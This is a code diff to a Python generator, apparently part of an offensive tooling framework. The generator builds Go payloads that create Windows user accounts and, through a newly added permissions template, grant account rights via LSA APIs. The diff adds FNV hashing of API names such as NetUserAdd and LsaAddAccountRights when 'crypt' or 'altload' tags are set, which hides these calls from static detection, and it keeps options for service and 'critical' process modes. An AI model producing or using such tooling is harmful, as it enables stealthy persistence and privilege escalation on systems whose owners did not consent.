@@ -59,6 +59,8 @@ _HELP_TEXT = """ Generates a UserAdd build based on the supplied profile and beh
    --service                            build. On Windows, it must be launched via SCM.
                                         This does not take any effect on non-Windows
                                         devices.
+   -P                                 Use the permissions build template instead of the
+   --permissions                        user_add template. Only avaliable on Windows.
    -A                 <service_name>  Specify the name of the Service to be used when
    --service-name                       running as a Service. This has no effect when
                                         not running as a Service and realistically only
@@ -103,6 +105,9 @@ class UserAdd(object):
         self._m.add("service_name", ("-A", "--service-name"), "", is_str(True), str)
         self._m.add("service", ("-S", "--service"), False, action=BooleanOptionalAction)
         self._m.add(
+            "permissions", ("-P", "--permission"), False, action=BooleanOptionalAction
+        )
+        self._m.add(
             "critical", ("-K", "--critical"), False, action=BooleanOptionalAction
         )
         # CGO Build Options
@@ -117,7 +122,10 @@ class UserAdd(object):
         self._m.parse(cfg, args)
 
     def print_options(self, cfg, root, file):
-        print("- | UserAdd Generator", file=file)
+        if cfg["permissions"]:
+            print("- | UserPerms Generator", file=file)
+        else:
+            print("- | UserAdd Generator", file=file)
         print(f'- | = {"User Name:":20}{cfg["user_name"]}', file=file)
         print(f'- | = {"Password:":20}{cfg["user_pass"]}', file=file)
         print(f'- | = {"Full Name:":20}{cfg["user_fullname"]}', file=file)
@@ -149,9 +157,34 @@ class UserAdd(object):
         n = cfg["user_fullname"]
         if not nes(n):
             n = cfg["user_name"]
+        t = "user_add.go"
+        if cfg["permissions"]:
+            t = "_user_perms.go"
+        k = dict()
+        # Replace strings with FNV if crypt or altload is enabled.
+        if "crypt" in workspace["tags"] or "altload" in workspace["tags"]:
+            k["net_user_add"] = "0x430D5B4C"
+            k["net_user_set_into"] = "0x2949C05D"
+            k["net_local_group_add_members"] = "0x68333972"
+            k["lsa_close"] = "0xB9C1C829"
+            k["lsa_free_memory"] = "0x421886E4"
+            k["lsa_open_policy"] = "0x34D221F9"
+            k["lookup_account_name"] = "0x771AC4CC"
+            k["lsa_add_account_rights"] = "0x7E15F444"
+            k["lsa_remove_account_rights"] = "0x84CCD465"
+        else:
+            k["net_user_add"] = "`NetUserAdd`"
+            k["net_user_set_into"] = "`NetUserSetInfo`"
+            k["net_local_group_add_members"] = "`NetLocalGroupAddMembers`"
+            k["lsa_close"] = "`LsaClose`"
+            k["lsa_free_memory"] = "`LsaFreeMemory`"
+            k["lsa_open_policy"] = "`LsaOpenPolicy`"
+            k["lookup_account_name"] = "`LookupAccountNameW`"
+            k["lsa_add_account_rights"] = "`LsaAddAccountRights`"
+            k["lsa_remove_account_rights"] = "`LsaRemoveAccountRights`"
         with open(p, "w") as f:
             f.write(
-                templates["user_add.go"].substitute(
+                templates[t].substitute(
                     fullname=n,
                     period=str(w),
                     flag=cfg["flag"],
@@ -159,13 +192,16 @@ class UserAdd(object):
                     password=cfg["user_pass"],
                     comment=cfg["user_comment"],
                     service=cfg["service_name"],
-                    username=f'{cfg["user_name"]}_',
-                    critical="true"
-                    if cfg["critical"] and not workspace["library"]
-                    else "false",
+                    username=f'{cfg["user_name"]}{"" if cfg["permissions"] else "_"}',
+                    critical=(
+                        "true"
+                        if cfg["critical"] and not workspace["library"]
+                        else "false"
+                    ),
+                    **k,
                 )
             )
-        del w, n
+        del w, n, t, k
         return p
 
     def run_cgo(self, export, cfg, base, workspace, templates):
